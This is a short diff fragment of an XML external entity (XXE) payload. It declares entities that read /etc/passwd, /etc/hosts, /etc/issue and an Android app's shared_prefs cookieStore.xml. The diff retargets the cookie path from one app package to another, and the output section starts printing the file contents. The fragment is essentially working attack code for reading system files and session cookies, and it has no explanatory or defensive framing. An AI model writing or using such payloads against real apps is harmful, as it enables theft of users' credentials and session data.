@@ -3,7 +3,7 @@
 <!ENTITY passwd SYSTEM "file:///etc/passwd">
 <!ENTITY hosts SYSTEM "file:///etc/hosts">
 <!ENTITY issue SYSTEM "file:///etc/issue">
-<!ENTITY cookie SYSTEM "file:///data/data/com.luna.music/shared_prefs/cookieStore.xml">
+<!ENTITY cookie SYSTEM "file:///data/data/com.ss.android.ugc.aweme/shared_prefs/cookieStore.xml">
 ]> 
 <p>
 <p>/etc/passwd: 
